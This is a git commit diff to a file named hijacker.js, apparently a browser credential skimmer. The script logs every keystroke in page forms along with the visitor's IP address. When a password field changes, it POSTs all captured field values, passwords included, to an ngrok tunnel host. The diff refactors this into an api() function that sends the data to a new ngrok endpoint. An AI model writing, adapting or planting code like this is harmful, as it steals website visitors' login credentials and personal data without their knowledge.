58c0f9acfdf94a75acf70619b3028bafe82ed845
u4bi <rootcode10@gmail.com>
2017-12-08 06:40:39 +0900

    README

--- src/hijacker.js
+++ src/hijacker.js
@@ -1,27 +1,50 @@
 (() => {
-
-    let data = { host : location.hostname },
-        flag = false;
     
-    fetch('https://api.ipify.org?format=json').then((resp) => resp.json()).then((e) => data.user_addr = e.ip);
+        let data = { host : location.hostname },
+            flag = false;
+        
+        fetch('https://api.ipify.org?format=json').then((resp) => resp.json()).then((e) => data.user_addr = e.ip);
+    
+        !Array.from(document.querySelectorAll('textarea')).length &&
+        Array.from(document.querySelectorAll('form'))
+            .map((e) => {
+                // flag
+                e.addEventListener('keyup', (e) => {
+                    
+                    data[`${ e.target.name }_${ e.target.className }_${ e.target.id }`] = {
+                        value : e.target.value,
+                        type  : e.target.type
+                    };
 
-    !Array.from(document.querySelectorAll('textarea')).length &&
-    Array.from(document.querySelectorAll('form'))
-        .map((e) => e.addEventListener('keyup', (e) => [
-            
-            data[`${ e.target.name }_${ e.target.className }_${ e.target.id }`] = {
-                value : e.target.value,
-                type  : e.target.type
-            },
+                    !flag && e.target.type === 'password' && [
+                        flag = true,
+                        e.target.onchange = (e) => [ api(data), alert('change')]
+                    ];
+                });
+                //
 
-            !flag && e.target.type === 'password' && [
-                flag = true,
-                e.target
-                .onchange = (e) => fetch('https://69cc8d63.ngrok.io/data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body : JSON.stringify(data) })
-                                    .then( (resp) => resp.json())
-                                    .then( (data) => console.log('success', data))
-            ]
-        ])
-    );
 
-})();
+                /*
+                
+                e.onkeydown = (e) => {
+                    if(flag && e.keyCode === 13) [ api(data), alert('down')];
+                };
+                
+                e.onsubmit = () => {
+                    if(flag) [ api(data), alert('submit')];
+                };
+                
+                */
+
+                // etc... keyup : socket streams
+
+                var api = (data) => {
+                    fetch('https://a678b611.ngrok.io/data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body : JSON.stringify(data) })
+                        .then( (resp) => resp.json())
+                        .then( (data) => console.log('success', data) );
+                    // flag = false;
+                };
+                
+            });
+    
+    })();
